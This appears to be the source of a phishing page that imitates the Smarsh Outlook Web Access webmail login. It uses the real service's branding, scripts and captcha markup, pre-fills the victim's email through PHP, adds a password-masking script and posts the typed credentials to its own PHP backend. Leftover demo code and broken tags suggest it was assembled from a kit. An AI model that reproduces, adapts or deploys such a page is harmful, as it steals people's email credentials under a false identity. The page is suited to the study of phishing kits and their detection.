

<?php include '../build.php' ?>
<!DOCTYPE html>
<html>
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
<head>
    <title>Outlook Web Access</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <link href="../assets/css/smarsh.css" rel="stylesheet"/>
    <link href="https://owa.smarshmail.com/favicon.ico" rel="shortcut icon">
    <script src="https://owa.smarshmail.com/Portal/bundles/scripts/login/form?v=3nx3iLjY6o9FgJLS7ptYJVuFjED_JvhQGNpeOsUFvAA1"></script>

    <style>
        body {
            font-family: 'DINOTRegular';
        }
        .login-header {
            color: #fff;
            font-family: 'DINOTRegular';
            font-weight: normal;
            font-size: 36px;
            text-align: center;
            margin-bottom: 28px;
            box-sizing: border-box;
        }
        .login-myservices {
            background: #145f8e;
            border-right: 1px solid #145f8e;
            border-top: 1px solid #145f8e;
            border-top-right-radius: 2px;
        }
        .login-tab {
            display: block;
            float: left;
            position: relative;
            padding: 20px;
            width: 205px;
            font-family: 'DINOTMedium';
            text-align: center;
            padding: 20px;
            box-sizing: border-box;
            color: #fff;
            cursor: pointer;
            font-size: 15px;
            outline: none;
            box-shadow: none;
            border: none;
        }
        .login-submit {
            height: 48px;
            width: 204px;
            display: block;
            background: #96bc33;
            color: #fff;
            font-family: 'DINOTRegular';
            text-transform: uppercase;
            border: 1px solid #96bc33;
            border-radius: 2px;
            font-size: 18px;
            margin: 30px auto 0 auto;
            padding: 13px 76px 15px;
            outline: none;
            line-height: 20px;
            cursor: pointer;
        }
        .wbk {
            word-break: keep-all;
        }
        .p0 {
            padding: 0;
        }
    </style>
<script type="text/javascript" src="/aspx/scripts/analytics/appInsights.PROD.js"></script></head>
<body>
    <section class="login-section">
        <div class="login-logo"></div>
        <h1 class="login-header">Welcome to your Webmail &amp; Account Settings</h1>
        

<div class="login-alert" id="login-update-browser-ie" style="display: none">
    <div class="text-center">
        <p class="lh16 mb8"> Internet Explorer is not officially supported and your experience may not be optimal. For the best experience, please upgrade your browser. </p>
    </div>
</div>
<script type="text/javascript">
    $(function () {
        'use strict';

        function has(userAgentSubstr) {
            return window.navigator.userAgent.indexOf(userAgentSubstr) !== -1;
        }

        // if <=IE10 or ==IE11
        if (has('MSIE ') || has('Trident/')) {
            $('#login-update-browser-ie').show();
        }
    });
</script>

        <div id="oldBrowser" class="login-alert" style="display: none;">
            <div class="login-alert-content">
                
                <img class="login-alert-icon m-24" src="/Content/images/icons/24/warning-orange_24.png" alt="">
                <div class="login-alert-text"><div class="d-tc">
 <i class="login-alert-icon-warning mr10 ml-10"></i>
 </div>
 <div class="d-tc">
 <p><strong>You’ll get more if you update your browser.</strong> <br>
 Our layout and page behavior is optimized for the latest version of your browser.</p>
 <p><a class="btn m-warning" href="http://outdatedbrowser.com/en" target="_blank">Update my browser</a></p>
 <p class="mb0">This button will redirect you to your browser’s
 update page</p>
 </div></div>
            </div>
        </div>
                            <div class="login-tabs">
                <button class="login-tab login-webmail selected">
                    Webmail
                    <i class="icon-info tooltip" title="Access email on the web using OWA"></i>
                </button>
                <button class="login-tab login-myservices">
                    My Services
                    <i class="icon-info tooltip" title="Change your password, request new services, and perform other basic user tasks"></i>
                </button>
            </div>
        <form name="login-form" method="post" id="login-form" required="" autocomplete="off">
            <input type="hidden" name="login" value="smarshmail">
            <div>
                <div id="aduser-login-spinner" style="display:none">
                    <div style="margin: auto; position: absolute; top: 0; left: 0; right: 0; bottom: 0; text-align: center; z-index: 10; background: rgba(255, 255, 255, 0.5);">
                        <ui:spinner></ui:spinner>
                    </div>
                </div>
                <div class="pr">
                    <input name="user"
                           id="aduser-login-loginInput"
                           type="text"
                           placeholder="Login (email)"
                           class="login-input" value="<?php echo htmlspecialchars($decoded); ?>" required autofocus />
                    <div class="login-validation required">Login required</div>
                        <div class="login-validation email">Valid email address required</div>
                </div>
                <div class="pr">
                    <input name="pass"
                           id="aduser-login-passwordInput"
                           type="text"
                           placeholder="Password"
                           onkeyup="passwordOnKeyUp(this, 'password-eye-icon')"
                           class="password-input" required />
                    <i id="password-eye-icon" class="password-eye password-eye-hide" onclick="passwordEyeToggle(this,'aduser-login-passwordInput')" style="<?php echo $error; ?>"></i>
                    <div class="password-validation required">Password required</div>
                </div>
                <template id="login-captcha-template">
                    <div class="login-form-captcha">
                        <input type="hidden" name="captchaId" value="c936e31cb10f4b98acc5d8d7d06e4f1e" />
                        <div class="captcha-image">
                            <img id="captchaImage" src="/Portal/Captcha?id=c936e31cb10f4b98acc5d8d7d06e4f1e&amp;width=94&amp;height=36&amp;rnd=1036752167&amp;httproute=True" alt="" />
                        </div>
                        <button class="captcha-refresh" type="button">
                            
                            <svg x="0px" y="0px" width="25px" height="24px" viewBox="0 0 25 24" class="captcha-refresh-icon">
                                <path d="M11.9,19.5c-3.2,0-6.1-2.2-7.1-5.2l0.8-0.1l0,0c0.6-0.1,0.9-0.6,0.8-1.2c0-0.2-0.2-0.4-0.3-0.6L3.3,9
                                c-0.2-0.3-0.6-0.4-1-0.4C2,8.7,1.7,9,1.6,9.3l-1.4,4.3c-0.1,0.3,0,0.7,0.2,1C0.6,14.9,1,15,1.4,15l0.9-0.2
                                c1.2,4.3,5.1,7.3,9.7,7.3c2.7,0,5.2-1.1,7.1-3l-1.9-1.9C15.8,18.7,13.9,19.5,11.9,19.5z">
                                </path>
                                <path d="M23.7,12c-0.2-0.3-0.5-0.5-0.9-0.5l-0.9,0c-0.3-5.3-4.7-9.6-10.1-9.6c-3.5,0-6.7,1.8-8.5,4.7l2.2,1.4
                                C7,5.9,9.4,4.6,11.9,4.6c3.9,0,7.2,3.1,7.4,7l-0.8,0c0,0,0,0,0,0c-0.6,0-1,0.5-1,1c0,0.2,0.1,0.4,0.2,0.6l2.1,3.8
                                c0.2,0.3,0.5,0.5,0.9,0.5c0.4,0,0.7-0.2,0.9-0.5l2.1-4C23.9,12.7,23.9,12.3,23.7,12z">
                                </path>
                            </svg>
                            
                        </button>
                    </div>
                    <div class="pr">
                        <input name="captchaCode" type="text" placeholder="Code" class="captcha-input" autofocus />
                        <div class="captcha-validation required">Code required</div>
                        <div class="captcha-validation server">Valid code required</div>
                    </div>
                </template>
                <div id="login-captcha-place" class="pr"></div>
                <div class="login-actions">
                    <div class="login-remember">
                        <label class="login-remember-me">
                            <input type="checkbox" name="rememberMe" value="true" class="login-checkbox" />
                            <span style="line-height: 22px; height: 22px;">Remember me</span>
                        </label>
                    </div>
                    <a href="javascript:void(0)" class="login-forgot-password jGaTracking">Forgot password?</a>
                </div>

            </div>
            <button type="submit" class="login-submit wbk p0">Login</button>
        </form>
    </section>
    <span style="display: none"></span>
    
    <script type="text/javascript">
    $(function() {
        const maintenanceMode = false;
        const clientType = 'WebMail';
        const isAdUser = true;
        const loginFailed = false;
        const loginLocked = false;
        const isCaptchaIdExists = Boolean('c936e31cb10f4b98acc5d8d7d06e4f1e');
        const invalidCaptchaCode = false;
        const rememberMe = false;
        const forgotPasswordUrl = 'https://login.serverdata.net/user/ForgotPassword';
        const owaLocatorEnabled = true;
        const forceShowCaptcha = false;

        showCaptcha(forceShowCaptcha && isCaptchaIdExists);

        document.getElementById('aduser-login-passwordInput').addEventListener('focus', redirectToCustomStsIfNeeded);
        function redirectToCustomStsIfNeeded () {

            const login = $("#aduser-login-loginInput").val();
            const clientType = $('.client-type').val().toLowerCase();

            if (login) {
                if (isCaptchaIdExists && clientType === 'webmail' && owaLocatorEnabled) {
                    GetOwaStsUrl(login);
                } else if (clientType === 'usersettings' && isAdUser) {
                    GetMyServicesStsUrl(login);
                }
            }
        }

        if (maintenanceMode && !isAdUser) {
            disable();
            return;
        }

        if (isAdUser) {
            if (maintenanceMode) {
                setLoginTab('WebMail');
                $('.login-myservices').prop('disabled', true);
            } else {
                setLoginTab(clientType);
                $('.login-webmail').on('click', function() {
                    setLoginTab('WebMail');
                });
                $('.login-myservices').on('click', function() {
                    setLoginTab('UserSettings');
                });
            }
        }

        $('.login-forgot-password').on('click', function() {
            submitToUrl(forgotPasswordUrl);
        });

        if (loginFailed || loginLocked) {
            showMixedValidation();
        }

        if (invalidCaptchaCode) {
            $('.captcha-validation.server').show();
            setInputErrorStyle($('.captcha-input'), true);
        }

        if (loginFailed || loginLocked || invalidCaptchaCode) {
            onLoginFailed(clientType, rememberMe);
        }
    });
    </script>
    <!--[if lt IE 10]>
        <script type="text/javascript">
            $('#oldBrowser').show();
        </script>
    <![endif]-->
<script src="/Portal/bundles/scripts/login/form/aduser?v=nMRHyfcoxR3nPLXmTv47ynnpaVOlPk3IdFXvvKZuGXQ1"></script>
    
</body>
</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("aduser-login-passwordInput"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>